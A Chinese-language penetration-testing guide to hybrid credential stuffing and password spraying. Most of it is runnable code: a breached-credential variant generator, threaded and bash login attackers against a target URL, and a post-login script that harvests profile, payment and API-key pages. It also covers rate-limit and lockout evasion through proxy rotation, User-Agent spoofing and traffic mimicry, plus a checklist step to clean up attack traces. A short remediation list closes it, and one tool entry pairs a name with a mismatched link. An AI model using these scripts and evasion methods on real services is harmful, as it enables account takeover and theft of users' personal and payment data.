# 混合凭证填充/密码喷洒攻击方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的混合凭证填充/密码喷洒攻击检测和利用流程。这种高级攻击技术结合了凭证填充和密码喷洒的特点，通过对泄露凭证进行智能变体和递增尝试，显著提高攻击成功率。

## 1.2 适用范围

本文档适用于所有存在用户认证机制的 Web 应用、API 接口、移动应用后端服务。

## 1.3 读者对象

本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 漏洞原理

混合凭证填充/密码喷洒攻击（Hybrid Credential Stuffing / Password Spray）是一种高级认证攻击技术，它结合了传统凭证填充和密码喷洒的优势：

- **凭证填充**：使用已知的 username/password 组合从其他数据泄露中尝试登录
- **密码喷洒**：对多个账户尝试少量常见密码
- **混合递增**：对泄露凭证进行智能变体或递增尝试

**本质问题**：
- 用户密码重用习惯
- 用户密码修改模式可预测（如 Password1 → Password2）
- 季节性密码模式（如 Winter2025 → Winter2026）
- 缺少多因素认证
- 缺少异常登录检测

### 常见 CWE 映射

| CWE 编号 | 描述 |
|---------|------|
| CWE-308 | 使用单因素认证 (Use of Single-factor Authentication) |
| CWE-521 | 弱密码要求 (Weak Password Requirements) |
| CWE-1391 | 使用弱凭证 (Use of Weak Credentials) |
| CWE-307 | 认证尝试限制不当 (Improper Restriction of Excessive Authentication Attempts) |

### 攻击技术对比

| 攻击类型 | 特点 | 检测难度 | 成功率 |
|---------|------|---------|-------|
| 传统凭证填充 | 直接使用泄露凭证 | 中 | 中 |
| 传统密码喷洒 | 单密码对多用户 | 低 | 低 - 中 |
| 混合递增攻击 | 凭证变体 + 递增 | 高 | 高 |

## 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 用户登录 | Web 登录表单 | 无速率限制、无 MFA |
| API 认证 | REST API 登录端点 | 无异常检测 |
| 移动应用 | App 登录接口 | 无设备指纹绑定 |
| 企业应用 | AD/LDAP 集成登录 | 密码策略弱 |
| 云服务 | SaaS 平台登录 | 无异地登录检测 |

### 高风险用户群体

| 用户类型 | 风险原因 | 典型密码模式 |
|---------|---------|-------------|
| 普通用户 | 密码重用 | Company123 → Company2025 |
| IT 管理员 | 多系统密码同步 | Admin@2025 → Admin@2026 |
| 财务人员 | 定期强制改密 | Finance01 → Finance02 |
| 开发人员 | 项目相关密码 | ProjectX1 → ProjectX2 |

## 2.3 漏洞发现方法

### 2.3.1 泄露凭证收集

```bash
# 常见泄露源
- Have I Been Pwned (https://haveibeenpwned.com/)
- DeHashed (https://dehashed.com/)
- Intelligence X (https://intelx.io/)
- 暗网市场和数据泄露论坛

# 凭证格式
username:password
email:password
phone:password
```

### 2.3.2 密码变体生成

**递增模式分析**：

```python
# 数字递增
Password1 → Password2 → Password3
Winter2025 → Winter2026 → Winter2027
ILoveMyDog6 → ILoveMyDog7 → ILoveMyDog8

# 特殊字符递增
Password1! → Password2! → Password3!
Admin@123 → Admin@124 → Admin@125

# 季节/年份模式
Spring2025 → Summer2025 → Fall2025 → Winter2025
Jan2025 → Feb2025 → Mar2025

# 常见变体规则
原始密码：Password
变体：
- Password1, Password123, Password1234
- password, PASSWORD, PaSsWoRd
- P@ssw0rd, P@$$word, Pa55word
- Password!, Password@, Password#
```

**自动化变体生成脚本**：

```python
#!/usr/bin/env python3
"""
混合凭证变体生成器
基于泄露凭证生成递增和变体密码列表
"""

import re
from datetime import datetime

def generate_password_variants(base_password):
    """生成密码变体列表"""
    variants = []
    
    # 1. 数字递增检测
    num_match = re.search(r'(\d+)$', base_password)
    if num_match:
        num = int(num_match.group(1))
        prefix = base_password[:num_match.start()]
        # 生成递增变体
        for i in range(num, num + 10):
            variants.append(f"{prefix}{i}")
    
    # 2. 年份检测
    year_match = re.search(r'(20\d{2})', base_password)
    if year_match:
        year = int(year_match.group(1))
        current_year = datetime.now().year
        # 生成过去年份和未来年份变体
        for y in range(year - 2, current_year + 2):
            variants.append(base_password.replace(str(year), str(y)))
    
    # 3. 月份检测
    month_match = re.search(r'(0[1-9]|1[0-2])', base_password)
    if month_match:
        month = int(month_match.group(1))
        # 生成相邻月份变体
        for m in range(1, 13):
            variants.append(base_password.replace(f"{month:02d}", f"{m:02d}"))
    
    # 4. 特殊字符变体
    special_chars = ['!', '@', '#', '$', '%', '^', '&', '*']
    for char in special_chars:
        variants.append(f"{base_password}{char}")
    
    # 5. 大小写变体
    variants.append(base_password.lower())
    variants.append(base_password.upper())
    variants.append(base_password.capitalize())
    
    return list(set(variants))

def generate_hybrid_credential_list(breached_file, output_file):
    """生成混合凭证列表"""
    with open(breached_file, 'r') as f, open(output_file, 'w') as out:
        for line in f:
            if ':' in line:
                username, password = line.strip().split(':', 1)
                # 添加原始凭证
                out.write(f"{username}:{password}\n")
                # 添加变体
                variants = generate_password_variants(password)
                for variant in variants:
                    out.write(f"{username}:{variant}\n")

if __name__ == '__main__':
    import sys
    if len(sys.argv) == 3:
        generate_hybrid_credential_list(sys.argv[1], sys.argv[2])
        print(f"Hybrid credential list generated: {sys.argv[2]}")
    else:
        print("Usage: python hybrid_creds.py <input_file> <output_file>")
```

### 2.3.3 速率限制检测

```bash
# 测试登录接口速率限制
for i in {1..20}; do
    curl -X POST https://target.com/login \
        -d "username=test&password=test$i" \
        -o /dev/null -s -w "%{http_code}\n"
done

# 检查响应：
# - 429 Too Many Requests: 有速率限制
# - 403 Forbidden: 可能触发 IP 封禁
# - 200 OK: 无速率限制或阈值很高
# - CAPTCHA 出现：有人机验证
```

### 2.3.4 账户锁定检测

```bash
# 测试账户锁定机制
for i in {1..10}; do
    response=$(curl -s -X POST https://target.com/login \
        -d "username=target_user&password=wrongpass")
    
    if echo "$response" | grep -q "account locked"; then
        echo "Account locked after $i attempts"
        break
    fi
done
```

## 2.4 漏洞利用方法

### 2.4.1 基础混合攻击

**攻击流程**：

```
1. 收集泄露凭证
   ↓
2. 生成密码变体（递增、季节、特殊字符）
   ↓
3. 对目标系统执行混合攻击
   ↓
4. 记录成功登录的凭证
   ↓
5. 维持访问（保存 Session/Token）
```

**自动化攻击脚本**：

```python
#!/usr/bin/env python3
"""
混合凭证填充攻击脚本
结合凭证填充和密码喷洒的混合攻击
"""

import requests
import time
from concurrent.futures import ThreadPoolExecutor

class HybridCredentialAttacker:
    def __init__(self, target_url, delay=0.1):
        self.target_url = target_url
        self.delay = delay
        self.session = requests.Session()
        self.successful_creds = []
    
    def generate_variants(self, password):
        """生成密码变体"""
        variants = [password]
        
        # 数字递增
        import re
        num_match = re.search(r'(\d+)$', password)
        if num_match:
            num = int(num_match.group(1))
            prefix = password[:num_match.start()]
            for i in range(num, num + 5):
                variants.append(f"{prefix}{i}")
        
        # 添加常见后缀
        suffixes = ['!', '123', '2025', '2026', '@', '#']
        for suffix in suffixes:
            variants.append(f"{password}{suffix}")
        
        return list(set(variants))
    
    def try_login(self, username, password):
        """尝试登录"""
        try:
            data = {
                'username': username,
                'password': password
            }
            response = self.session.post(self.target_url, data=data)
            
            # 检查登录成功标志
            if 'success' in response.text.lower() or \
               response.status_code == 302 or \
               'dashboard' in response.text.lower():
                print(f"[+] SUCCESS: {username}:{password}")
                self.successful_creds.append((username, password))
                return True
            
            return False
        except Exception as e:
            print(f"[-] Error: {e}")
            return False
    
    def attack_user(self, username, base_passwords):
        """对单个用户执行混合攻击"""
        print(f"[*] Attacking user: {username}")
        
        all_passwords = []
        for password in base_passwords:
            all_passwords.extend(self.generate_variants(password))
        
        for password in all_passwords:
            if self.try_login(username, password):
                return True
            time.sleep(self.delay)
        
        return False
    
    def attack_multiple_users(self, credentials_file):
        """对多个用户执行攻击"""
        with open(credentials_file, 'r') as f:
            user_passwords = {}
            for line in f:
                if ':' in line:
                    user, password = line.strip().split(':', 1)
                    if user not in user_passwords:
                        user_passwords[user] = []
                    user_passwords[user].append(password)
        
        # 使用线程池并发攻击
        with ThreadPoolExecutor(max_workers=5) as executor:
            for user, passwords in user_passwords.items():
                executor.submit(self.attack_user, user, passwords)
    
    def save_results(self, output_file):
        """保存成功凭证"""
        with open(output_file, 'w') as f:
            for username, password in self.successful_creds:
                f.write(f"{username}:{password}\n")

if __name__ == '__main__':
    attacker = HybridCredentialAttacker(
        target_url='https://target.com/login',
        delay=0.5  # 500ms 延迟避免触发速率限制
    )
    attacker.attack_multiple_users('breached_credentials.txt')
    attacker.save_results('successful_credentials.txt')
```

### 2.4.2 季节性密码喷洒

```python
#!/usr/bin/env python3
"""
季节性密码喷洒攻击
基于时间模式的密码猜测
"""

from datetime import datetime

def generate_seasonal_passwords(base_word):
    """生成季节性密码"""
    current_year = datetime.now().year
    current_month = datetime.now().month
    
    # 确定季节
    if current_month in [3, 4, 5]:
        season = "Spring"
    elif current_month in [6, 7, 8]:
        season = "Summer"
    elif current_month in [9, 10, 11]:
        season = "Fall"
    else:
        season = "Winter"
    
    passwords = []
    
    # 季节 + 年份模式
    passwords.append(f"{season}{current_year}")
    passwords.append(f"{season}{current_year - 1}")
    passwords.append(f"{season}{current_year + 1}")
    
    # 月份模式
    passwords.append(f"{base_word}{current_month:02d}{current_year}")
    
    # 常见变体
    passwords.append(f"{base_word}@{current_year}")
    passwords.append(f"{base_word}#{current_year}")
    passwords.append(f"{base_word}!{current_year}")
    
    return passwords

# 使用示例
company_names = ["Company", "Admin", "User", "Test"]
for name in company_names:
    passwords = generate_seasonal_passwords(name)
    for pwd in passwords:
        print(pwd)
```

### 2.4.3 凭证填充 + 密码喷洒组合

```bash
#!/bin/bash
# 组合攻击脚本：先凭证填充，后密码喷洒

BREACHED_CREDS="breached_credentials.txt"
COMMON_PASSWORDS="common_passwords.txt"
TARGET_USERS="target_users.txt"
LOGIN_URL="https://target.com/login"

echo "[*] Phase 1: Credential Stuffing"
while IFS=: read -r username password; do
    response=$(curl -s -X POST "$LOGIN_URL" \
        -d "username=$username&password=$password")
    
    if echo "$response" | grep -qi "success\|welcome\|dashboard"; then
        echo "[+] SUCCESS: $username:$password"
        echo "$username:$password" >> successful_creds.txt
    fi
done < "$BREACHED_CREDS"

echo "[*] Phase 2: Password Spray with Variants"
while read -r username; do
    # 从已成功的凭证中获取该用户的基础密码
    base_password=$(grep "^$username:" successful_creds.txt 2>/dev/null | cut -d: -f2)
    
    if [ -n "$base_password" ]; then
        # 生成变体并尝试
        echo "[*] Trying variants for $username (base: $base_password)"
        
        # 数字递增
        if [[ $base_password =~ ([0-9]+)$ ]]; then
            num=${BASH_REMATCH[1]}
            prefix=${base_password%$num}
            for i in $(seq $((num+1)) $((num+5))); do
                new_pass="${prefix}${i}"
                response=$(curl -s -X POST "$LOGIN_URL" \
                    -d "username=$username&password=$new_pass")
                if echo "$response" | grep -qi "success"; then
                    echo "[+] SUCCESS: $username:$new_pass"
                    echo "$username:$new_pass" >> successful_creds.txt
                    break
                fi
            done
        fi
    fi
done < "$TARGET_USERS"
```

### 2.4.4 会话维持和数据收集

```python
#!/usr/bin/env python3
"""
成功登录后的会话维持和数据收集
"""

import requests
import json

def maintain_session_and_collect(session_cookie, target_url):
    """维持会话并收集敏感数据"""
    session = requests.Session()
    session.cookies.set('session', session_cookie)
    
    # 收集的数据点
    data_points = {
        'profile': '/profile',
        'orders': '/orders',
        'payment': '/payment-methods',
        'settings': '/settings',
        'api_keys': '/api-keys',
    }
    
    collected_data = {}
    
    for name, endpoint in data_points.items():
        try:
            response = session.get(f"{target_url}{endpoint}")
            if response.status_code == 200:
                collected_data[name] = response.text
                print(f"[+] Collected {name}: {len(response.text)} bytes")
        except Exception as e:
            print(f"[-] Failed to collect {name}: {e}")
    
    return collected_data

def save_session(session_cookie, output_file):
    """保存会话用于后续访问"""
    with open(output_file, 'w') as f:
        f.write(f"session={session_cookie}\n")
```

## 2.5 漏洞利用绕过方法

### 2.5.1 速率限制绕过

**技巧 1：分布式攻击**

```python
# 使用多个代理 IP
proxies = [
    {'http': 'http://proxy1:8080', 'https': 'http://proxy1:8080'},
    {'http': 'http://proxy2:8080', 'https': 'http://proxy2:8080'},
    {'http': 'http://proxy3:8080', 'https': 'http://proxy3:8080'},
]

proxy_index = 0
for attempt in range(100):
    proxy = proxies[proxy_index % len(proxies)]
    response = requests.post(url, data=data, proxies=proxy)
    proxy_index += 1
```

**技巧 2：慢速攻击**

```python
# 在请求间添加随机延迟
import random
import time

for attempt in range(50):
    response = requests.post(url, data=data)
    delay = random.uniform(2, 5)  # 2-5 秒随机延迟
    time.sleep(delay)
```

**技巧 3：User-Agent 轮换**

```python
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15',
    'Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36',
]

headers = {'User-Agent': random.choice(user_agents)}
response = requests.post(url, data=data, headers=headers)
```

### 2.5.2 账户锁定绕过

**技巧 4：密码轮换策略**

```
对每个用户只尝试少量密码，避免触发锁定：

用户 1: 尝试 Password1, Password2, Password3 (3 次)
用户 2: 尝试 Password1, Password2, Password3 (3 次)
用户 3: 尝试 Password1, Password2, Password3 (3 次)
...

等待一段时间后，再进行第二轮：
用户 1: 尝试 Password4, Password5, Password6 (3 次)
```

**技巧 5：用户名变体**

```bash
# 尝试用户名变体绕过基于用户名的锁定
admin
admin@domain.com
DOMAIN\\admin
admin#
_admin
administrator
```

### 2.5.3 检测规避

**技巧 6：正常流量伪装**

```python
# 模拟正常用户行为
def simulate_normal_behavior(session, base_url):
    # 访问首页
    session.get(f"{base_url}/")
    time.sleep(random.uniform(1, 3))
    
    # 访问关于页面
    session.get(f"{base_url}/about")
    time.sleep(random.uniform(1, 3))
    
    # 访问联系页面
    session.get(f"{base_url}/contact")
    time.sleep(random.uniform(1, 3))
    
    # 然后才尝试登录
    session.post(f"{base_url}/login", data=login_data)
```

**技巧 7：时间分布优化**

```
工作时间（9:00-18:00）：降低攻击频率，模拟正常办公时间
非工作时间（18:00-9:00）：可适当提高频率
周末：降低频率或暂停
```

---

# 第三部分：附录

## 3.1 常用 Payload 速查表

| 类别 | Payload 示例 | 说明 |
|-----|-------------|------|
| 数字递增 | Password1 → Password2 → Password3 | 末尾数字递增 |
| 年份模式 | Winter2025 → Winter2026 | 年份递增 |
| 季节模式 | Spring2025 → Summer2025 → Fall2025 | 季节轮换 |
| 特殊字符 | Password1 → Password1! → Password1@ | 添加特殊字符 |
| 大小写变体 | Password → password → PASSWORD | 大小写变换 |
| 常见后缀 | Admin → Admin123 → Admin@2025 | 常见密码后缀 |

## 3.2 混合攻击检查清单

```
□ 收集泄露凭证
□ 生成密码变体（递增、季节、特殊字符）
□ 检测速率限制
□ 检测账户锁定机制
□ 检测 MFA 启用状态
□ 执行混合攻击
□ 记录成功凭证
□ 维持会话访问
□ 收集敏感数据
□ 清理攻击痕迹
```

## 3.3 常用工具

| 工具 | 用途 | 链接 |
|-----|------|------|
| SNIPR | 凭证填充 | https://github.com/byt3bl33d3r/SprayingToolkit |
| OpenBullet | 图形化凭证测试 | https://openbullet.dev/ |
| Burp Suite Intruder | 手动凭证测试 | https://portswigger.net/burp |
| Hydra | 多协议暴力破解 | https://github.com/vanhauser-thc/thc-hydra |
| 自定义脚本 | 混合变体生成 | 本文提供的脚本 |

## 3.4 修复建议

1. **多因素认证** - 启用 MFA 可阻止 99.9% 的凭证填充攻击
2. **强密码策略** - 禁止常见密码和已泄露密码
3. **速率限制** - 基于账户而非 IP 的失败计数
4. **异常检测** - 监控异地登录、异常时间登录
5. **凭证检查** - 对照泄露密码库检查用户密码
6. **用户教育** - 提醒用户不要重用密码
7. **密码管理器** - 鼓励用户使用密码管理器生成唯一密码
8. **定期审计** - 定期检查用户密码强度

---

**参考资源**：
- [OWASP Credential Stuffing](https://cheatsheetseries.owasp.org/cheatsheets/Credential_Stuffing_Prevention_Cheat_Sheet.html)
- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [Have I Been Pwned](https://haveibeenpwned.com/)
- [NIST SP 800-63B Digital Identity Guidelines](https://pages.nist.gov/800-63-3/sp800-63b.html)
